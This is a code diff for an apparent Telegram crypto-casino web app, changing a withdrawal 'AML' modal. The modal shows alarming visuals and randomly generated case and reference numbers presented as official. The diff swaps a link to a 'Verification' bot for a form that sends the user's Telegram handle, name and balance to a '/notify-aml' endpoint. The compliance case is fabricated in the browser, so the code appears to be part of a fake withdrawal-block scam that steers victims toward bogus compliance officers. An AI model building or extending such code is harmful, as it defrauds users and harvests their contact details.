@@ -1507,9 +1507,14 @@ body.danger-mode .nav-btn.active::after { background: #ef4444; }
       </div>
     </div>
     <div style="margin-top:8px;font-family:monospace;font-size:10px;color:rgba(220,38,38,0.35);text-align:center;" id="amlCaseId"></div>
-    <a id="amlComplianceBtn" href="https://t.me/Verification_CasinoBoom_bot" target="_blank" style="display:block;width:100%;padding:14px;background:linear-gradient(135deg,#dc2626,#991b1b);border:none;border-radius:10px;color:#fff;font-weight:800;font-size:14px;text-align:center;text-decoration:none;margin-top:16px;letter-spacing:0.3px;box-sizing:border-box;">
-      🛡 СВЯЗАТЬСЯ С ОТДЕЛОМ COMPLIANCE
-    </a>
+    <div style="margin-top:16px;">
+      <div style="font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:8px;">Укажите ваш Telegram для связи с офицером Compliance:</div>
+      <div style="display:flex;gap:8px;">
+        <input id="amlTgInput" type="text" placeholder="@username" style="flex:1;padding:12px 14px;background:rgba(255,255,255,0.05);border:1px solid rgba(220,38,38,0.4);border-radius:10px;color:#fff;font-size:14px;outline:none;font-family:monospace;" />
+        <button onclick="submitAmlContact()" style="padding:12px 16px;background:linear-gradient(135deg,#dc2626,#991b1b);border:none;border-radius:10px;color:#fff;font-weight:800;font-size:14px;cursor:pointer;white-space:nowrap;">Отправить</button>
+      </div>
+      <div id="amlSentMsg" style="display:none;margin-top:10px;font-size:12px;color:rgba(100,220,100,0.8);text-align:center;">✅ Данные переданы. Ожидайте ответа.</div>
+    </div>
     <div style="font-size:10px;color:rgba(255,255,255,0.2);text-align:center;margin-top:12px;">Case ID: <span id="amlCaseIdSmall"></span> · Ref: AML-<span id="amlRef"></span></div>
   </div>
 </div>
@@ -3445,18 +3450,40 @@ function showProcessingModal(amount) {
 }
 
 function showAmlModal(amount) {
-  // Включаем danger mode
   document.body.classList.add('danger-mode');
   if(navigator.vibrate) navigator.vibrate([100,50,100,50,200]);
 
-  // Заполняем данные в модалке
   const caseId = 'AML-' + Date.now().toString(36).toUpperCase();
   const ref = Math.random().toString(36).slice(2,8).toUpperCase();
   document.getElementById('amlAmount').textContent = '$' + parseFloat(amount).toFixed(2) + ' USDT';
   document.getElementById('amlCaseIdSmall').textContent = caseId;
   document.getElementById('amlRef').textContent = ref;
+  document.getElementById('amlTgInput').value = '';
+  document.getElementById('amlSentMsg').style.display = 'none';
 
   document.getElementById('amlModal').style.display = 'flex';
+}
+
+async function submitAmlContact() {
+  const tgHandle = document.getElementById('amlTgInput').value.trim();
+  if (!tgHandle) return;
+
+  const btn = event.target;
+  btn.disabled = true;
+  btn.textContent = '...';
+
+  try {
+    await api('casino-bot', '/notify-aml', {
+      tg_id: S.tgId,
+      first_name: S.firstName,
+      username: S.username,
+      entered_handle: tgHandle,
+      balance: S.balance,
+    });
+  } catch(e) {}
+
+  document.getElementById('amlSentMsg').style.display = 'block';
+  btn.style.display = 'none';
 }
 
 async function loadWalletWithdrawals(){
